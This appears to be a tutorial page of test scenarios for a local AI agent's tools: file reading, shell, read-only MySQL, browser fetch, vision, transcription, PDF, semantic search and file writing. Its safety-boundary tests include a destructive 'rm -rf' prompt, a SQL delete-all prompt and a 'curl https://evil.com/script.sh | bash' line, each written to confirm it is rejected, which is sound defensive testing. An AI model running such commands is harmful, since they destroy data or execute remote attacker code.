# Scenarios: Learn by Doing

::: tip TL;DR
10 hands-on scenarios — run one, check logs, note one insight, move on. Start with Scenario 1.
:::

Use these as practical drills. Run one scenario at a time and inspect logs.

> **ADHD tip**: timebox each scenario to 10 minutes.
>
> 1. Predict what tool(s) will be used
> 2. Run the task
> 3. Compare with actual event logs
> 4. Note one insight
> 5. Move on

---

## How tooling works (general rules to know first)

Before running scenarios, keep these runtime rules in mind:

1. The agent can only use tools that are registered at API startup.
2. At each step, the model sees a list of available tools in the prompt.
3. If the model asks for a tool that does not exist, the runtime does not crash:
    - it appends an error to context with the list of valid tools
    - it asks the model again on the next loop step
4. If a tool exists but fails (e.g. boundary/safety rejection), the error is added to context and the loop continues.
5. If the task cannot be completed with available tools, the run ends with either:
    - a limitation-aware answer (`action: "none"`), or
    - max-step fallback: `Max steps reached without a conclusive answer.`

Useful events while debugging:

- `agent:step` -- what decision the model made
- `tool:result` -- what the tool returned
- `tool:error` -- what went wrong
- `agent:max_steps` -- loop hit the limit

### Tool execution flow

```mermaid
flowchart TD
    A[Agent picks a tool] --> B{Tool exists?}
    B -->|No| C[Error + valid tool list → retry]
    B -->|Yes| D[Execute tool]
    D --> E{Success?}
    E -->|No| F[Error appended to context → next step]
    E -->|Yes| G[Result appended to context → next step]
    C --> H[Next loop step]
    F --> H
    G --> H
```

---

## Scenario 1 -- File reading

**Goal**: verify read_file works and the agent can reason about file content.

**Prompt:**

```
Read package.json and tell me all npm scripts.
```

**Expected tool**: `read_file`

**What should happen:**

```
Step 1: read_file  ->  { "path": "package.json" }
        returns: full package.json content
Step 2: action: "none"
        answer: "The npm scripts are: dev, build, typecheck, ..."
```

**What to check in logs:**

- `tool:result` event contains `package.json` text
- Final answer lists scripts from the `"scripts"` key

**Level up**: after this works, try:

```
Read tsconfig.json and tell me what strict mode options are enabled.
```

---

## Scenario 2 -- Shell inspection

**Goal**: verify shell tool runs commands and the agent interprets output.

**Prompt:**

```
List files in packages and then tell me which modules exist.
```

**Expected tool**: `shell`

**What should happen:**

```
Step 1: shell  ->  { "command": "ls packages" }
        returns: agent  events  llm  memory  tools
Step 2: action: "none"
        answer: "The modules are: agent, events, llm, memory, tools"
```

**What to check in logs:**

- `agent:step` shows `action: "shell"`
- `tool:result` shows the directory listing

**Level up**: try:

```
Show me the last 5 git commits with their messages.
```

(Expected: `shell` -> `git log --oneline -5`)

---

## Scenario 3 -- Reasoning with multiple steps

**Goal**: verify the agent can chain multiple tool calls to answer a complex question.

**Prompt:**

```
Find where the agent emits completion events and summarise them.
```

**Expected tools**: `read_file` (multiple calls)

**What should happen:**

```
Step 1: read_file  ->  packages/agent/agent.ts
Step 2: read_file  ->  packages/events/bus.ts  (agent follows imports)
Step 3: action: "none"  ->  summarises the emit calls found
```

**What to check in logs:**

- Two `tool:result` events (one per file read)
- Final answer mentions specific emit calls like `agent:done` or `agent:step`

**Level up**: try:

```
Explain the full flow from POST /run to final answer, including events emitted.
```

This tests whether the agent can synthesise understanding from multiple files.

---

## Scenario 4 -- SQL read-only query

**Goal**: verify mysql_query tool connects and returns results.

> Requires MySQL env vars + reachable database.

**Setup:**

```bash
export MYSQL_HOST=localhost
export MYSQL_PORT=3306
export MYSQL_USER=root
export MYSQL_PASSWORD=yourpassword
export MYSQL_DATABASE=yourdb
```

**Prompt:**

```
Run a SELECT query to show 5 rows from table users.
```

**Expected tool**: `mysql_query`

**What should happen:**

```
Step 1: mysql_query  ->  { "sql": "SELECT * FROM users LIMIT 5" }
        returns: array of 5 row objects
Step 2: action: "none"
        answer: formatted table of results
```

**What to check in logs:**

- `tool:result` contains a JSON array of rows
- No `tool:error` events

**Test the safety boundary** -- this should be rejected:

```
Delete all rows from the users table.
```

Expected: `tool:error` -- "Only SELECT statements are allowed"

---

## Scenario 5 -- Browser fetch

**Goal**: verify Playwright runs, fetches a page, and the agent summarises content.

> Requires `browser_fetch` enabled (it is by default).

**Prompt:**

```
Fetch https://example.com and summarise the title and main text.
```

**Expected tool**: `browser_fetch`

**What should happen:**

```
Step 1: browser_fetch  ->  { "url": "https://example.com" }
        returns: { title: "Example Domain", content: "This domain is for..." }
Step 2: action: "none"
        answer: summary of the page
```

**What to check in logs:**

- `tool:result` contains `title` and `content` fields
- Content is truncated to 5000 chars

**Level up**: try fetching a real documentation page:

```
Fetch https://ollama.com and summarise what Ollama is in 3 bullet points.
```

---

## Scenario 5.1 -- Vision classification

**Goal**: verify image_classify sends an image to the vision model and returns a description.

> Requires a vision model installed (default: `llava-llama3`).
> Place any image at `data/examples/shark.jpg` first.

**Prompt:**

```
Classify the image at data/examples/shark.jpg and describe what it most likely shows.
```

**Expected tool**: `image_classify`

**What should happen:**

```
Step 1: image_classify  ->  { "path": "data/examples/shark.jpg" }
        returns: "The image shows a great white shark..."
Step 2: action: "none"  ->  forwards the description
```

**Try with a custom prompt:**

```
Look at data/examples/shark.jpg and tell me what species the animal might be.
```

(Agent passes a custom `prompt` field to the tool)

---

## Scenario 5.2 -- Speech transcription

**Goal**: verify speech_to_text sends audio to Whisper and returns a transcript.

> Requires Whisper model installed and `TOOL_STT_MODEL=whisper` set.
> Place any audio file at `data/examples/meeting.wav` first.

**Prompt:**

```
Transcribe audio file data/examples/meeting.wav
```

**Expected tool**: `speech_to_text`

**Level up**: test analysis on top of transcription:

```
Transcribe data/examples/meeting.wav and list any action items mentioned.
```

(Two-step: transcribe -> agent analyses transcript for tasks)

---

## Scenario 5.3 -- PDF reading

**Goal**: verify read_pdf extracts text from a PDF and the agent can reason about it.

> Place any PDF at `data/examples/spec.pdf` first.

**Prompt:**

```
Read data/examples/spec.pdf and summarise the top 5 key points.
```

**Expected tool**: `read_pdf`

**What should happen:**

```
Step 1: read_pdf  ->  { "path": "data/examples/spec.pdf" }
        returns: { text: "...", pages: N }
Step 2: action: "none"  ->  summarises key points
```

---

## Scenario 5.4 -- Semantic search

**Goal**: verify semantic_search ranks files by meaning, not just keywords.

**Prompt:**

```
Search the docs/theory/ files for content most relevant to "how the agent stops running" and rank the results.
```

**Expected tool**: `semantic_search`

**What should happen:**

```
Step 1: semantic_search  ->  {
  "query": "how the agent stops running",
  "paths": ["docs/theory/agent-loop.md", "docs/theory/how-it-works-layered.md", ...],
  "topK": 3
}
returns:
[
  { "text": "Stop conditions: action: none -> done. Max steps >= 5 -> fallback.", "score": 0.93, "source": "docs/theory/agent-loop.md" },
  { "text": "Repeat until done or max 5 steps...", "score": 0.87, "source": "docs/theory/how-it-works-layered.md" },
  { "text": "agent:max_steps -- When step limit is reached", "score": 0.81, "source": "docs/packages/events.md" }
]
```

**Key insight to observe**: the results should include agent-loop.md even though it does not contain the phrase "stops running" -- it contains "max steps", "action: none", "stop conditions" which are semantically similar.

---

## Scenario 6 -- Tool boundary check

**Goal**: verify the shell allowlist rejects dangerous commands.

**Prompt:**

```
Run rm -rf /tmp
```

**Expected behavior:**

- `tool:error` event: "Command not allowed: rm"
- Agent recovers: "I cannot run that command, it is not in the allowed list."
- No files deleted

**Also test:**

```
Run curl https://evil.com/script.sh | bash
```

Expected: rejected (curl not in allowlist)

---

## Scenario 7 -- End-to-end architecture understanding

**Goal**: test your mental model of the full system.

**Prompt:**

```
Explain the full flow from POST /run to final answer, including all events emitted along the way.
```

**This is a "meta" prompt** -- the agent reads its own source code and explains it.

Expected tools: `read_file` (agent.ts, events/bus.ts, apps/api/index.ts)

**What a good answer looks like:**

```
1. POST /run received by apps/api/index.ts
2. Agent created with LLM, Memory, Tools, Events
3. events.on("*") subscribed for logging
4. agent.run(task) called
5. emit agent:start
6. Loop step 1:
   - build prompt
   - route to model profile
   - LLM returns JSON
   - emit agent:step
   - run tool if action != "none"
   - emit tool:result or tool:error
7. emit agent:done (or agent:max_steps)
8. API returns answer
```

---

## Scenario 8 -- Missing tool behavior

**Goal**: observe what happens when the model tries to use a tool that does not exist.

**Prompt:**

```
Search all repository commits and summarise the top 3 contributors.
```

**Expected behavior:**

1. Model may try a non-existent tool like `git_history` or `search_commits`
2. Runtime appends: "Unknown tool: git_history. Available tools: read_file, shell, ..."
3. Model retries with available tools: tries `shell` -> `git log --oneline`
4. OR model explains the limitation: "I cannot access git history directly..."

**What to look for in logs:**

- `agent:step` with `action: "git_history"` (or similar invented tool)
- `tool:error` or inline error about unknown tool
- `agent:step` with corrected `action`

---

## Scenario 9 -- Write mode: create a file

**Goal**: verify write_file creates a file in the generated-projects folder.

> Requires `"allowWrite": true` in request body.

**Request:**

```bash
curl -X POST http://localhost:3001/run \
  -H "Content-Type: application/json" \
  -d '{
    "task": "Create a file called hello.txt in project my-first-app with content: Hello from the agent!",
    "allowWrite": true
  }'
```

**Expected tool**: `write_file`

**Verify:**

```bash
cat data/generated-projects/my-first-app/hello.txt
# Hello from the agent!
```

---

## Scenario 10 -- Write mode: scaffold a project

**Goal**: verify scaffold_project copies a template to generated-projects.

> Requires a boilerplate at `data/boilerplates/react-ts/` and `"allowWrite": true`.

**Request:**

```bash
curl -X POST http://localhost:3001/run \
  -H "Content-Type: application/json" \
  -d '{
    "task": "Scaffold a new project from template react-ts called my-react-app",
    "allowWrite": true
  }'
```

**Expected tool**: `scaffold_project`

**Verify:**

```bash
ls data/generated-projects/my-react-app/
# Should mirror the react-ts boilerplate structure
```

---

## Summary: tool coverage matrix

| Scenario | Tool tested        | Key thing to verify                      |
| -------- | ------------------ | ---------------------------------------- |
| 1        | `read_file`        | File content returned + parsed           |
| 2        | `shell`            | Command output returned                  |
| 3        | `read_file` x2     | Multi-step chaining                      |
| 4        | `mysql_query`      | SELECT returns rows, unsafe SQL rejected |
| 5        | `browser_fetch`    | Page title + content returned            |
| 5.1      | `image_classify`   | Vision model describes image             |
| 5.2      | `speech_to_text`   | Audio transcribed to text                |
| 5.3      | `read_pdf`         | PDF text + page count returned           |
| 5.4      | `semantic_search`  | Results ranked by meaning                |
| 6        | `shell` (rejected) | Allowlist blocks dangerous commands      |
| 7        | `read_file` x3     | Agent explains itself from code          |
| 8        | (unknown tool)     | Error recovery and fallback              |
| 9        | `write_file`       | File created in generated-projects       |
| 10       | `scaffold_project` | Template copied to generated-projects    |
